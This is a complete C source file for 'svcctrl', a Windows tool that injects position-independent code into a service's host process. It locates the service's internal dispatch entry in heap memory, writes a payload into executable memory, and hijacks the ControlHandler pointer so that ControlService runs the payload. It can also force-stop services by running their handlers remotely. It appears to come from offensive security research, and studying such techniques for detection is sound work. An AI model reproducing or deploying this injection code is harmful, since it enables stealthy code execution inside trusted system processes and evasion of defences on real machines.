/**
  Copyright © 2018 Odzhan. All Rights Reserved.

  Redistribution and use in source and binary forms, with or without
  modification, are permitted provided that the following conditions are
  met:

  1. Redistributions of source code must retain the above copyright
  notice, this list of conditions and the following disclaimer.

  2. Redistributions in binary form must reproduce the above copyright
  notice, this list of conditions and the following disclaimer in the
  documentation and/or other materials provided with the distribution.

  3. The name of the author may not be used to endorse or promote products
  derived from this software without specific prior written permission.

  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
  POSSIBILITY OF SUCH DAMAGE. */
  
#define UNICODE
#pragma warning(disable : 4311)
#pragma warning(disable : 4312)

#include <Windows.h>
#include <tlhelp32.h>
#include <shlwapi.h>
#include <Winternl.h>
#include <psapi.h>
#include <dbghelp.h>

#define UNICODE
#define _WIN32_DCOM

#include <windows.h>
#include <Wbemidl.h>
#include <Shlwapi.h>

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>

#pragma comment(lib, "wbemuuid.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "oleAut32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "dbghelp.lib")

typedef DWORD (WINAPI *RtlCreateUserThread_t)(
    IN HANDLE               ProcessHandle,
    IN PSECURITY_DESCRIPTOR SecurityDescriptor,
    IN BOOL                 CreateSuspended,
    IN ULONG                StackZeroBits,
    IN OUT PULONG           StackReserved,
    IN OUT PULONG           StackCommit,
    IN LPVOID               StartAddress,
    IN LPVOID               StartParameter,
    OUT HANDLE              ThreadHandle,
    OUT LPVOID              ClientID);
    
#ifdef LEGACY
typedef struct _INTERNAL_DISPATCH_ENTRY {
    LPWSTR                  ServiceName;
    LPWSTR                  ServiceRealName;
    LPSERVICE_MAIN_FUNCTION ServiceStartRoutine;
    LPHANDLER_FUNCTION_EX   ControlHandler;
    HANDLE                  StatusHandle;
    DWORD                   ServiceFlags;
    DWORD                   Tag;
    HANDLE                  MainThreadHandle;
    DWORD                   dwReserved;
} INTERNAL_DISPATCH_ENTRY, *PINTERNAL_DISPATCH_ENTRY;
#else
typedef struct _INTERNAL_DISPATCH_ENTRY {
    LPWSTR                  ServiceName;
    LPWSTR                  ServiceRealName;
    LPWSTR                  ServiceName2;       // Windows 10
    LPSERVICE_MAIN_FUNCTION ServiceStartRoutine;
    LPHANDLER_FUNCTION_EX   ControlHandler;
    HANDLE                  StatusHandle;
    DWORD64                 ServiceFlags;        // 64-bit on windows 10
    DWORD64                 Tag;
    HANDLE                  MainThreadHandle;
    DWORD64                 dwReserved;
    DWORD64                 dwReserved2;
} INTERNAL_DISPATCH_ENTRY, *PINTERNAL_DISPATCH_ENTRY;
#endif

typedef struct _SERVICE_ENTRY {
  INTERNAL_DISPATCH_ENTRY ide;               // copy of IDE
  WCHAR                   svcName[MAX_PATH];
  WCHAR                   svcReal[MAX_PATH];
  LPVOID                  ide_addr;          // remote address of IDE
  WCHAR                   service[MAX_PATH]; // name of service
  DWORD                   tid;               // thread id belonging to service
  DWORD                   pid;               // process id hosting service
  WCHAR                   process[MAX_PATH]; // process name hosting service
  BOOL                    bAll;
  HANDLE                  hThread;
} SERVICE_ENTRY, *PSERVICE_ENTRY;


// display error message for last error code
VOID xstrerror (PWCHAR fmt, ...){
    PWCHAR  error=NULL;
    va_list arglist;
    WCHAR   buffer[1024];
    DWORD   dwError=GetLastError();
    
    va_start(arglist, fmt);
    _vsnwprintf(buffer, ARRAYSIZE(buffer), fmt, arglist);
    va_end (arglist);
    
    if (FormatMessage (
          FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM,
          NULL, dwError, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), 
          (LPWSTR)&error, 0, NULL))
    {
      wprintf(L"  [ %s : %s\n", buffer, error);
      LocalFree (error);
    } else {
      wprintf(L"  [ %s error : %08lX\n", buffer, dwError);
    }
}

DWORD name2pid(LPWSTR ImageName) {
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    DWORD          dwPid=0;
    
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        if (lstrcmpi(ImageName, pe32.szExeFile)==0) {
          dwPid = pe32.th32ProcessID;
          break;
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return dwPid;
}

PWCHAR pid2name(DWORD pid) {
    HANDLE         hSnap;
    BOOL           bResult;
    PROCESSENTRY32 pe32;
    PWCHAR         name=L"N/A";
    
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    
    if (hSnap != INVALID_HANDLE_VALUE) {
      pe32.dwSize = sizeof(PROCESSENTRY32);
      
      bResult = Process32First(hSnap, &pe32);
      while (bResult) {
        if (pe32.th32ProcessID == pid) {
          name = pe32.szExeFile;
          break;
        }
        bResult = Process32Next(hSnap, &pe32);
      }
      CloseHandle(hSnap);
    }
    return name;
}

// enable or disable a privilege in current process token
BOOL SetPrivilege(PWCHAR szPrivilege, BOOL bEnable){
    HANDLE           hToken;
    BOOL             bResult;
    LUID             luid;
    TOKEN_PRIVILEGES tp;

    // open token for current process
    bResult = OpenProcessToken(GetCurrentProcess(),
      TOKEN_ADJUST_PRIVILEGES, &hToken);
    
    if(!bResult)return FALSE;
    
    // lookup privilege
    bResult = LookupPrivilegeValueW(NULL, szPrivilege, &luid);
    if(bResult){
      tp.PrivilegeCount           = 1;
      tp.Privileges[0].Luid       = luid;
      tp.Privileges[0].Attributes = bEnable?SE_PRIVILEGE_ENABLED:SE_PRIVILEGE_REMOVED;

      // adjust token
      bResult = AdjustTokenPrivileges(hToken, FALSE, &tp, 0, NULL, NULL);
    }
    CloseHandle(hToken);
    return bResult;
}

#if !defined (__GNUC__)
/**
 *
 * Returns TRUE if process token is elevated
 *
 */
BOOL IsElevated(VOID) {
    HANDLE          hToken;
    BOOL            bResult = FALSE;
    TOKEN_ELEVATION te;
    DWORD           dwSize;
      
    if (OpenProcessToken (GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
      if (GetTokenInformation (hToken, TokenElevation, &te,
          sizeof(TOKEN_ELEVATION), &dwSize)) {
        bResult = te.TokenIsElevated;
      }
      CloseHandle(hToken);
    }
    return bResult;
}
#endif

BOOL StopService(PSERVICE_ENTRY se){
    DWORD                   evt;
    HANDLE                  hThread, hProcess;
    RtlCreateUserThread_t   pRtlCreateUserThread;
    BOOL                    bResult=FALSE;
    
    wprintf(L"[*] Attempting to stop service...\n");
      
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, TRUE, se->pid);
    
    if(hProcess == NULL) {
      xstrerror(L"StopService::OpenProcess");
      return 0;
    }
    // resolve address of RtlCreateUserThread
    // CreateRemoteThread won't work here..
    pRtlCreateUserThread=
      (RtlCreateUserThread_t)GetProcAddress(
      LoadLibrary(L"ntdll"), "RtlCreateUserThread");

    // got it?
    if (pRtlCreateUserThread!=NULL) {
      // execute the ControlHandler in remote process space
      pRtlCreateUserThread(hProcess, NULL, FALSE,
          0, NULL, NULL, se->ide.ControlHandler,
          (LPVOID)SERVICE_CONTROL_STOP, &hThread, NULL);

      bResult = (hThread != NULL);
      
      // if thread created
      if (bResult) {
        // wait 5 seconds for termination
        evt = WaitForSingleObject(hThread, 5*1000);
        bResult = (evt == WAIT_OBJECT_0);
        
        CloseHandle(hThread);
      }
      wprintf(L"[*] Service %s stopped.\n", 
        bResult ? L"successfully" : L"unsuccessfully");
    }
    CloseHandle(hProcess);
    return bResult;
}

VOID SvcCtrlInject(PSERVICE_ENTRY se, LPVOID payload, DWORD payloadSize) {
    SIZE_T                  wr;
    SC_HANDLE               hm, hs;
    INTERNAL_DISPATCH_ENTRY ide;
    HANDLE                  hp;
    LPVOID                  cs;
    SERVICE_STATUS          ss;
    
    wprintf(L"[*] Attempting to inject PIC into \"%s\"...\n", se->process);
    
    // open the service control manager
    hm = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
    if (hm != NULL) {
      // open target service
      hs = OpenService(hm, se->service, SERVICE_INTERROGATE);
      if (hs != NULL) {
        // open target process
        hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, se->pid);
        if (hp != NULL) {
          // allocate memory for payload
          cs = VirtualAllocEx(hp, NULL, payloadSize, 
            MEM_COMMIT, PAGE_EXECUTE_READWRITE);
          if (cs) {
            // write payload to process space
            WriteProcessMemory(hp, cs, payload, payloadSize, &wr);
            // create backup of IDE
            CopyMemory(&ide, &se->ide, sizeof(ide));
            // point ControlHandler to payload
            ide.ControlHandler = cs;
            // change flags
            ide.ServiceFlags   = SERVICE_CONTROL_INTERROGATE;
            // update IDE in remote process
            WriteProcessMemory(hp, se->ide_addr, &ide, sizeof(ide), &wr);
            // trigger payload
            wprintf(L"[*] Set a breakpoint on %p\n", cs);
            getchar();
            ControlService(hs, SERVICE_CONTROL_INTERROGATE, &ss);
            xstrerror(L"ControlService");
            // free payload from memory
            VirtualFreeEx(hp, cs, payloadSize, MEM_RELEASE);
            // restore original IDE
            WriteProcessMemory(hp, se->ide_addr, 
              &se->ide, sizeof(ide), &wr);
          } else xstrerror(L"VirtualAllocEx");
          CloseHandle(hp);      // close process
        } else xstrerror(L"OpenProcess");
        CloseServiceHandle(hs); // close service
      } else xstrerror(L"OpenService");
      CloseServiceHandle(hm);   // close manager
    }
}

BOOL GetProcessImageName(DWORD dwPid, 
  LPWSTR ImageName, DWORD dwSize) 
{
    HANDLE         hSnap;
    PROCESSENTRY32 pe32;
    BOOL           bFound=FALSE;
    
    // create snapshot of system
    hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if(hSnap == INVALID_HANDLE_VALUE) return 0;
    
    pe32.dwSize = sizeof(PROCESSENTRY32);

    // get first process
    if(Process32First(hSnap, &pe32)){
      do {
        if(dwPid == pe32.th32ProcessID) {
          lstrcpyn(ImageName, pe32.szExeFile, dwSize);
          bFound = TRUE;
          break;
        }
      } while(Process32Next(hSnap, &pe32));
    }
    CloseHandle(hSnap);
    return bFound;
}

DWORD GetServicePid(IWbemServices *svc, PWCHAR targetService) {
    IEnumWbemClassObject *e   = NULL;
    IWbemClassObject     *obj = NULL;
    ULONG                cnt;
    VARIANT              v;
    HRESULT              hr;
    DWORD                pid = 0;
    
    // obtain list of Win32_Service instances
    hr = svc->lpVtbl->CreateInstanceEnum(svc,
        L"Win32_Service", 
        WBEM_FLAG_RETURN_IMMEDIATELY | 
        WBEM_FLAG_FORWARD_ONLY, NULL, &e); 

    if (SUCCEEDED(hr)) {
      // loop through each one
      for (;;) {
        cnt = 0;
        hr  = e->lpVtbl->Next(e, INFINITE, 1, &obj, &cnt);

        if (cnt == 0) break;

        VariantInit (&v);

        // get the name of service
        hr = obj->lpVtbl->Get(obj, L"Name", 0, &v, NULL, NULL);

        if (SUCCEEDED(hr)) {
          // does it match target service name?
          if (lstrcmpi(targetService, V_BSTR(&v)) == 0) {
            // retrieve the process id
            hr = obj->lpVtbl->Get(obj, 
                L"ProcessID", 0, &v, NULL, NULL);
                
            if (SUCCEEDED(hr)) {
              pid = V_UI4(&v);
              break;
            }
          }
        }
        VariantClear(&v);
        obj->lpVtbl->Release(obj);
      }
      e->lpVtbl->Release(e); 
      e = NULL;
    }
    return pid;
}

// return a process id for service
BOOL GetServiceInfo(PSERVICE_ENTRY ste) {
    IWbemLocator  *loc = NULL;
    IWbemServices *svc = NULL;
    HRESULT       hr;
    
    // initialize COM
    hr = CoInitializeEx (NULL, COINIT_MULTITHREADED);
      
    if (SUCCEEDED(hr)) {
      // setup security
      hr = CoInitializeSecurity(
          NULL, -1, NULL, NULL, 
          RPC_C_AUTHN_LEVEL_DEFAULT, 
          RPC_C_IMP_LEVEL_IMPERSONATE, 
          NULL, EOAC_NONE, NULL);
        
      if (SUCCEEDED(hr)) {
        // create locator
        hr = CoCreateInstance (
          &CLSID_WbemLocator, 
          0, CLSCTX_INPROC_SERVER, 
          &IID_IWbemLocator, (LPVOID*)&loc);
              
        if (SUCCEEDED(hr)) {
          // connect to service
          hr = loc->lpVtbl->ConnectServer(
            loc, L"root\\cimv2", 
            NULL, NULL, NULL, 0, 
            NULL, NULL, &svc);
            
          if (SUCCEEDED(hr)) {
            // get the process id
            ste->pid = GetServicePid(svc, ste->service);
            // get the process name
            GetProcessImageName(ste->pid, ste->process, MAX_PATH);
            // release service object
            svc->lpVtbl->Release(svc);
            svc = NULL;
          }
          // release locator object
          loc->lpVtbl->Release(loc);
          loc = NULL;
        }
      }
      CoUninitialize();
    }
    return ste->pid != 0;
}

// display values of the dispatch entry
VOID DisplayIDE(PSERVICE_ENTRY ste) {
    WCHAR         path[MAX_PATH];
    BYTE          buffer[sizeof(SYMBOL_INFO)+MAX_SYM_NAME*sizeof(WCHAR)];
    PSYMBOL_INFO  pSymbol=(PSYMBOL_INFO)buffer;
    HANDLE        hp;
    
    hp = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ste->pid);
    SymInitialize(hp, NULL, TRUE);
    
    wprintf(L"ServiceName         : %p (%s)\n",  
      ste->ide.ServiceName, ste->svcName);
      
    wprintf(L"ServiceRealName     : %p (%s)\n",  
      ste->ide.ServiceRealName, ste->svcReal);
    
    ZeroMemory(path, ARRAYSIZE(path));
    
    GetMappedFileName(hp, 
      (LPVOID)ste->ide.ServiceStartRoutine, 
      path, MAX_PATH);
      
    PathStripPath(path);
    
    wprintf(L"ServiceStartRoutine : %p : %s",  
      ste->ide.ServiceStartRoutine, path);
          
    pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
    pSymbol->MaxNameLen   = MAX_SYM_NAME;
    
    if(SymFromAddr(hp, 
      (DWORD64)ste->ide.ServiceStartRoutine, 
      NULL, pSymbol)) 
    {
      wprintf(L"!%hs", pSymbol->Name);
    }
    putchar('\n');
    
    // display ControlHandler
    ZeroMemory(path, ARRAYSIZE(path));
    
    GetMappedFileName(hp, 
      (LPVOID)ste->ide.ControlHandler, 
      path, MAX_PATH);
      
    PathStripPath(path);
    
    wprintf(L"ControlHandler      : %p : %s",  
      ste->ide.ControlHandler, path);
    
    pSymbol->SizeOfStruct = sizeof(SYMBOL_INFO);
    pSymbol->MaxNameLen   = MAX_SYM_NAME;
    
    if(SymFromAddr(hp, 
      (DWORD64)ste->ide.ControlHandler, 
      NULL, pSymbol)) 
    {
      wprintf(L"!%hs", pSymbol->Name);
    }
    putchar('\n');
    
    wprintf(L"StatusHandle        : %p\n",  
      ste->ide.StatusHandle);
    
    wprintf(L"ServiceFlags        : %p\n",  
      (void*)ste->ide.ServiceFlags);
    
    wprintf(L"Tag                 : %p\n",  
      (void*)ste->ide.Tag);
    
    wprintf(L"MainThreadHandle    : %p (%d) (use with -t option)\n\n",
      (void*)ste->ide.MainThreadHandle, 
      (int)ste->ide.MainThreadHandle);
      
    SymCleanup(hp);
    CloseHandle(hp);
}
      
// validates a windows service IDE
BOOL IsValidIDE(HANDLE hProcess, PSERVICE_ENTRY ste) {
    MEMORY_BASIC_INFORMATION mbi;
    SIZE_T                   rd;
    DWORD                    res;
    
    // these values shouldn't be empty
    if (ste->ide.ServiceName         == NULL || 
        ste->ide.ServiceRealName     == NULL ||
        ste->ide.ServiceStartRoutine == NULL ||
        ste->ide.ControlHandler      == NULL ||
        ste->ide.MainThreadHandle    == NULL) return FALSE;
    
    // string pointers should be equal
    if (ste->ide.ServiceName != 
        ste->ide.ServiceRealName) return FALSE;
    
    // service flags shouldn't exceed 128
    if (ste->ide.ServiceFlags > 128) return FALSE;
    
    // check main thread handle
    if (ste->ide.MainThreadHandle > (HANDLE)0xFFFF) return FALSE;
    
    // the start routine should reside
    // in executable memory.
    res = VirtualQueryEx(hProcess, 
      ste->ide.ServiceStartRoutine, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_EXECUTE_READ)) return FALSE;

    // the control handler should reside
    // in executable memory.
    res = VirtualQueryEx(hProcess, 
      ste->ide.ControlHandler, &mbi, sizeof(mbi));
      
    if (res != sizeof(mbi)) return FALSE;
    if (!(mbi.Protect & PAGE_EXECUTE_READ)) return FALSE;
    
    // try read the service name 
    if (!ReadProcessMemory(hProcess, 
        ste->ide.ServiceName, ste->svcName, 
        MAX_PATH, &rd)) return FALSE;
       
    // try read the service real name
    if (!ReadProcessMemory(hProcess, 
        ste->ide.ServiceRealName, ste->svcReal, 
        MAX_PATH, &rd)) return FALSE;
    
    return TRUE;
}

BOOL FindServiceIDE(HANDLE hProcess, 
  LPVOID BaseAddress, DWORD RegionSize, PSERVICE_ENTRY ste) 
{
    LPBYTE addr = BaseAddress;
    DWORD  pos, res;
    BOOL   bRead, bFound = FALSE;
    SIZE_T rd;
    
    // scan memory for IDE
    for (pos = 0; 
         pos <= (RegionSize - sizeof(INTERNAL_DISPATCH_ENTRY));
         pos += sizeof(ULONG_PTR)) 
    {
      // try read an internal dispatch entry
      bRead = ReadProcessMemory(hProcess, 
        &addr[pos], &ste->ide, 
        sizeof(INTERNAL_DISPATCH_ENTRY), &rd);
      
      if (bRead && rd == sizeof(INTERNAL_DISPATCH_ENTRY)) {
        if (IsValidIDE(hProcess, ste)) {
          // if we're searching for all services
          // display the entry we found
          if (ste->bAll) {
            wprintf(L"[+] Found IDE at address: %p.\n\n", addr+pos);
        
            DisplayIDE(ste);
            
          } else {
            // save the position of IDE
            ste->ide_addr = addr + pos;
            // if we have a thread handle, validate by this value
            if (ste->hThread != 0) {
              bFound = (ste->ide.MainThreadHandle == ste->hThread);
            } else {
            // otherwise, compare with service name instead           
              bFound = (lstrcmpi(ste->service, ste->svcName)==0);
            }
            if (bFound) break;
          }
        }
      }
    }
    return bFound;
}

BOOL GetServiceIDE(PSERVICE_ENTRY ste) {
    HANDLE                   hProcess;
    SYSTEM_INFO              si;
    MEMORY_BASIC_INFORMATION mbi;
    LPBYTE                   addr;     // current address
    ULONG_PTR                ptr;
    DWORD                    res;
    BOOL                     bFound = FALSE;
    
    // get the name and id of process hosting service
    if (!GetServiceInfo(ste)) {
      printf("Unable to obtain service information.\n");
      ste->pid = name2pid(ste->service);
      if(ste->pid == 0) {
        ste->pid = _wtoi(ste->service);
        if(ste->pid == 0) {
          printf("Unable to obtain process id.\n");
          return FALSE;
        }
      }
    }
    
    wprintf(L"Process id for %s is %ld\n", ste->service, ste->pid);
    
    // try open the host process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, ste->pid);
    
    // if process opened
    if (hProcess != NULL) {
      // get memory info
      GetSystemInfo(&si);
      
      for (addr=0; addr < si.lpMaximumApplicationAddress;) {
        ZeroMemory(&mbi, sizeof(mbi));
        res = VirtualQueryEx(hProcess, addr, &mbi, sizeof(mbi));

        // we only want to scan the heap, but this will scan stack space too.
        if ((mbi.State == MEM_COMMIT)  &&
            (mbi.Type  == MEM_PRIVATE) && 
            (mbi.Protect == PAGE_READWRITE)) 
        {
          bFound = FindServiceIDE(hProcess, 
            mbi.BaseAddress, mbi.RegionSize, ste);
          if (bFound) break;
        }
        addr = (PBYTE)mbi.BaseAddress + mbi.RegionSize;
      }
      CloseHandle(hProcess);
    }
    return bFound;
}

DWORD readpic(PWCHAR path, LPVOID *pic){
    HANDLE hf;
    DWORD  len,rd=0;
    
    // 1. open the file
    hf = CreateFile(path, GENERIC_READ, 0, 0,
      OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
      
    if(hf != INVALID_HANDLE_VALUE){
      // get file size
      len = GetFileSize(hf, 0);
      // allocate memory
      *pic = malloc(len + 16);
      // read file contents into memory
      ReadFile(hf, *pic, len, &rd, 0);
      CloseHandle(hf);
    }
    return rd;
}

VOID usage(VOID){
    wprintf(L"\nusage: svcctrl -[options] <service name>\n\n");
    wprintf(L"        -l          : display all IDE found for process scanned\n");
    wprintf(L"        -i <pic>    : inject a payload into host process using service\n");
    wprintf(L"        -t <handle> : validate by thread handle instead of service name\n");
    wprintf(L"        -s          : stop service\n");
    exit(0);
}

int main(void) {
    PWCHAR        *argv, service=NULL, pfile=NULL;
    int           argc, i;
    WCHAR         opt;
    BOOL          bInject=FALSE, bStop=FALSE, bFound=FALSE, bAll=FALSE;
    SERVICE_ENTRY ste;
    DWORD         thread=0, payloadSize=0;
    LPVOID        payload=NULL;
    
    // get parameters
    argv = CommandLineToArgvW(GetCommandLine(), &argc);
    
    for(i=1; i<=argc-1; i++){
      // is this a switch?
      if(argv[i][0]==L'/' || argv[i][0]==L'-'){
        // check it out
        switch(argv[i][1]) {
          case L'l':
            bAll=TRUE;
            break;
          case L's':
            bStop=TRUE;
            break;
          case L'i':
            bInject=TRUE;
            pfile = argv[++i];
            break;
          case L't':
            thread = _wtoi(argv[++i]);
            break;
          case L'?':
          case L'h':
          default:
            usage();
            break;
        }
      } else if (service==NULL) {
        service = argv[i];
      } else {
        usage();
      }
    }
    // if no service, display usage
    if (service == NULL) {
      wprintf(L"[-] No service specified.\n");
      usage();
    }
      
    // if both inject and stop, throw an error
    if (bInject & bStop) {
      wprintf(L"[-] Injecting and stopping a service simultaneously isn't supported.\n");
      return 0;
    }
    
    if (bInject && pfile == NULL) {
      wprintf(L"[-] No PIC file specified for injection.\n");
      return 0;
    }
    
    if (pfile != NULL) {
      // try read pic
      payloadSize = readpic(pfile, &payload);
      if (payloadSize == 0) { 
        wprintf(L"[-] Unable to read PIC from %s\n", pfile); 
        return 0; 
      }
    }
    
    // if not elevated, display warning
    if(!IsElevated())
      wprintf(L"[*] WARNING: This requires elevated privileges!.\n");
    
    // try enable debug privilege
    if(!SetPrivilege(SE_DEBUG_NAME, TRUE)){
      wprintf(L"[-] Unable to enable SeDebugPrivilege.\n");
      return 0;
    }
    
    SymSetOptions(SYMOPT_DEFERRED_LOADS);
    
    ZeroMemory(&ste, sizeof(ste));    
    lstrcpyn(ste.service, service, MAX_PATH);
    
    ste.bAll    = bAll;
    ste.hThread = (HANDLE)thread;
    
    // now try find the IDE for service
    if (GetServiceIDE(&ste)) {
      wprintf(L"[+] Found IDE for \"%s\" in %s:%i at address: %p.\n\n", 
        ste.service, ste.process, ste.pid, ste.ide_addr);

      DisplayIDE(&ste);
        
      // stopping?
      if (bStop) {
        StopService(&ste);
      } else 
      // injecting?
      if (bInject) {    
        SvcCtrlInject(&ste, payload, payloadSize);
      } else {
        wprintf(L"[*] No action specified.\n");
      }
    } else {
      if (!ste.bAll) {
        wprintf(L"[*] Try using -l option to list potential entries.\n");
      }
    }
    return 0;
}

